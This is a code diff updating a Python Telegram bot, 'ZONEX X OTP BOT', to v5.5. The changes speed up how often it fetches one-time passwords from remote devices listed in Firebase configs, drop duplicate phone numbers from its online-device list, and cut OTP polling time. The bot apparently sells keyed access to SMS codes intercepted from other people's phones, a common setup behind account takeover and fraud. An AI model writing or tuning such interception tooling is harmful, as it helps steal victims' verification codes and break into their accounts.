@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.4              ║
-║  Fixed Start Flow & Premium Welcome      ║
+║        ZONEX X OTP BOT v5.5              ║
+║  Fixed Duplicate Numbers & Fast OTP      ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -30,7 +30,7 @@ ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.str
 ADMIN_USERNAME = "@AG14447"
 BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
-AUTO_REFRESH   = 10
+AUTO_REFRESH   = 3  # <--- FIX 1: Auto refresh fast kiya (10s se 3s)
 
 # ─── Firebase Configuration ─────────────────────────────────────────────────
 FIREBASE_CONFIG = {
@@ -96,7 +96,6 @@ def _default_data() -> dict:
     }
 
 def _migrate_keys(d: dict) -> dict:
-    """Purani non-ZONEX keys ko ZONEX format mein badlo."""
     for uid, u in d.get("users", {}).items():
         k = u.get("key", "")
         if not k.startswith("ZONEX-"):
@@ -111,10 +110,7 @@ def load_data() -> dict:
             with open(DATA_FILE) as f:
                 d = json.load(f)
             d.pop("activation_codes", None)
-            
-            # Run key migration
             d = _migrate_keys(d)
-            
             for uid, u in d.get("users", {}).items():
                 u.setdefault("expires_at",     None)
                 u.setdefault("referred_by",    None)
@@ -169,10 +165,7 @@ async def _load_firestore() -> bool:
                 if not isinstance(d, dict):
                     return False
                 d.pop("activation_codes", None)
-                
-                # Run key migration
                 d = _migrate_keys(d)
-                
                 for uid, u in d.get("users", {}).items():
                     u.setdefault("expires_at",     None)
                     u.setdefault("referred_by",    None)
@@ -571,13 +564,27 @@ def count_total() -> int:
 def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  ★★★ FIX 2: DUPLICATE NUMBERS HATANE KA FUNCTION ★★★
+# ══════════════════════════════════════════════════════════════════════════════
 def all_online() -> list:
-    return [
-        (lb, did, info)
-        for lb, dm in device_cache.items()
-        for did, info in dm.items()
-        if info.get("online")
-    ]
+    seen_numbers = set()
+    online_devices = []
+    
+    for lb, dm in device_cache.items():
+        for did, info in dm.items():
+            if info.get("online"):
+                phone = info.get("phone", "—")
+                
+                # Agar same number pehle aa chuka hai toh skip karo
+                if phone != "—":
+                    if phone in seen_numbers:
+                        continue
+                    seen_numbers.add(phone)
+                
+                online_devices.append((lb, did, info))
+                
+    return online_devices
 
 def resolve_label(esc: str) -> str:
     for cfg in data["firebase_configs"]:
@@ -1231,7 +1238,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             save_data(data)
             key = get_key(uid)
             
-            # ── WELCOME PREMIUM KEY MESSAGE ──
             await q.edit_message_text(
                 f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
                 f"🎉 <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏!</b>\n"
@@ -1327,7 +1333,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     elif cb.startswith("online:"):
         pg = int(cb.split(":")[1])
         
-        # ── SCREENSHOT WALA PREMIUM SYNCING MESSAGE ──
         sync_msg = (
             "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
             " 🔄 <b>𝐒𝐘𝐍𝐂𝐈𝐍𝐆 𝐀𝐋𝐋 𝐍𝐔𝐌𝐁𝐄𝐑𝐒...</b>\n"
@@ -1354,7 +1359,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         total_online_all = count_online()
         total_devices_all = count_total()
 
-        # ── Premium ONLINE DEVICES header ──
         if not devs:
             txt = (
                 f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
@@ -1441,9 +1445,10 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if otp_to_show is None and cfg:
             known_key = (fresh_otps[0]["otp"], fresh_otps[0]["sender"], fresh_otps[0]["time"]) \
                         if fresh_otps else None
-            deadline = asyncio.get_event_loop().time() + 30
+            # FIX 3: Wait time kam kiya (30s se 15s) aur loop speed badhayi (3s se 1s)
+            deadline = asyncio.get_event_loop().time() + 15
             while asyncio.get_event_loop().time() < deadline:
-                await asyncio.sleep(3)
+                await asyncio.sleep(1)
                 try:
                     polled, _ = await fetch_otps(cfg["url"], cfg.get("key",""), did)
                 except Exception:
@@ -2635,7 +2640,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.4 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.5 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
@@ -2660,10 +2665,12 @@ def main():
     app.add_handler(MessageHandler(filters.Sticker.ALL, sticker_broadcast_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
     app.add_error_handler(error_handler)
-    app.job_queue.run_repeating(auto_fetch, interval=AUTO_REFRESH, first=3, name="auto_fetch")
 
-    logger.info("✅ Bot running! Send /start on Telegram.")
-    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+    if app.job_queue:
+        app.job_queue.run_repeating(auto_fetch, interval=AUTO_REFRESH, first=5)
+
+    logger.info("✅ Bot polling started...")
+    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
